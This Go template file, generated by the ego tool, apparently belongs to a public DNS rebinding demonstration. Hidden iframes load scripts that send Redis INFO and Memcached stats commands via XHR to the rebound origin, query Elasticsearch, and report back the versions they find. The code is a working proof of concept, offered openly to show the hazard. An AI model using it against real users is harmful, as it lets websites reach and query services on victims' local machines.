// Generated by ego.
// DO NOT EDIT

package template

import (
	"fmt"
	"html"
	"io"
)

var _ = fmt.Sprint("") // just so that we can keep the fmt import for now
//line elasticsearch.ego:1
func ElasticsearchExtract(w io.Writer) error {
//line elasticsearch.ego:2
	_, _ = io.WriteString(w, "\n<html>\n<head>\n  <title>Elasticsearch extractor</title>\n</head>\n<body>\n  <pre id=\"result\"></pre>\n  <script>\n    function poll() {\n      var xhr = new XMLHttpRequest();\n      xhr.open(\"GET\", document.location.origin);\n      xhr.onreadystatechange = function() {\n        if (xhr.readyState !== 4) {\n          return;\n        }\n        if (xhr.status === 200) {\n          var response = xhr.response;\n          var version = JSON.parse(response).version.number;\n          window.top.postMessage(\"You're running ElasticSearch version \" + version, '*');\n        } else if (xhr.status === 404) {\n          window.top.postMessage(\".\", '*');\n          setTimeout(poll, 5000);\n        } else {\n          window.top.postMessage(\"You don't seem to be running ElasticSearch\", '*');\n        }\n      };\n      xhr.send();\n    }\n    setTimeout(poll, 5000);\n  </script>\n</body>\n</html>\n")
	return nil
}

//line home.ego:1
func Home(w io.Writer, urls []string) error {
//line home.ego:2
	_, _ = io.WriteString(w, "\n\n<html>\n<head>\n  <title>ExtractData</title>\n  <style>\n    * {box-sizing: border-box}\n    #container {max-width:100%; width: 800px;margin: 0 auto;padding: 10px;}\n  </style>\n</head>\n<body>\n  ")
//line home.ego:12
	for _, url := range urls {
//line home.ego:13
		_, _ = io.WriteString(w, "\n    <iframe style=\"display:none\" src=\"")
//line home.ego:13
		_, _ = io.WriteString(w, html.EscapeString(fmt.Sprintf("%v", url)))
//line home.ego:13
		_, _ = io.WriteString(w, "\"></iframe>\n  ")
//line home.ego:14
	}
//line home.ego:15
	_, _ = io.WriteString(w, "\n  <div id=\"container\">\n    <h1>Extract Data</h1>\n    <p>This page will attempt to extract information from Redis, Memcached and ElasticSearch running on localhost using a technique called <a href=\"https://en.wikipedia.org/wiki/DNS_rebinding\" target=\"_blank\">DNS rebinding</a>. This demo takes about 1 minute, and it should display a version message for every accessible service. If the service cannot be reached, it will instead display a message stating that the service wasn't found. You can read more about this on my <a href=\"http://bouk.co/blog/hacking-developers/\" target=\"_blank\">blog</a></p>\n    <pre id=\"results\">Please wait</pre>\n    <script>\n      window.addEventListener('message', function(e) {\n        if (e.data !== '.') {\n          document.querySelector('#results').innerHTML += \"\\n\";\n        }\n        document.querySelector('#results').innerHTML += e.data;\n      });\n    </script>\n    <p><small>Made by <a href=\"http://bouk.co\" target=\"_blank\">Bouke</a></small></p>\n  </div>\n</body>\n</html>\n")
	return nil
}

//line memcached.ego:1
func MemcachedExtract(w io.Writer) error {
//line memcached.ego:2
	_, _ = io.WriteString(w, "\n<html>\n<head>\n  <title>Memcached extractor</title>\n</head>\n<body>\n  <pre id=\"result\"></pre>\n  <script>\n    function poll() {\n      var xhr = new XMLHttpRequest();\n      xhr.open(\"POST\", document.location.origin);\n      xhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n      xhr.overrideMimeType(\"text/plain\");\n      xhr.onreadystatechange = function() {\n        if (xhr.readyState !== 4) {\n          return;\n        }\n        if (xhr.status === 200) {\n          var response = xhr.response;\n          var version = /^STAT version (.*)$/gm.exec(response)[1];\n          window.top.postMessage(\"You're running memcached version \" + version, '*');\n        } else if (xhr.status === 404) {\n          window.top.postMessage(\".\", '*');\n          setTimeout(poll, 5000);\n        } else {\n          window.top.postMessage(\"You don't seem to be running memcached\", '*');\n        }\n      };\n      xhr.send(\"stats\\r\\nversion\\r\\nquit\\r\\n\");\n    }\n    setTimeout(poll, 5000);\n  </script>\n</body>\n</html>\n")
	return nil
}

//line redis.ego:1
func RedisExtract(w io.Writer) error {
//line redis.ego:2
	_, _ = io.WriteString(w, "\n<html>\n<head>\n  <title>Redis extractor</title>\n</head>\n<body>\n  <pre id=\"result\"></pre>\n  <script>\n    function poll() {\n      var xhr = new XMLHttpRequest();\n      xhr.open(\"POST\", document.location.origin);\n      xhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n      xhr.overrideMimeType(\"text/plain\");\n      xhr.onreadystatechange = function() {\n        if (xhr.readyState !== 4) {\n          return;\n        }\n\n        if (xhr.status === 200) {\n          var response = xhr.response;\n          var version = /^redis_version:(.*)$/gm.exec(response)[1];\n          window.top.postMessage(\"You're running Redis version \" + version, '*');\n        } else if (xhr.status === 404) {\n          window.top.postMessage(\".\", '*');\n          setTimeout(poll, 5000);\n        } else {\n          window.top.postMessage(\"You don't seem to be running Redis\", '*');\n        }\n      };\n      xhr.send(\"INFO\\r\\nQUIT\\r\\n\");\n    }\n    setTimeout(poll, 5000);\n  </script>\n</body>\n</html>\n")
	return nil
}
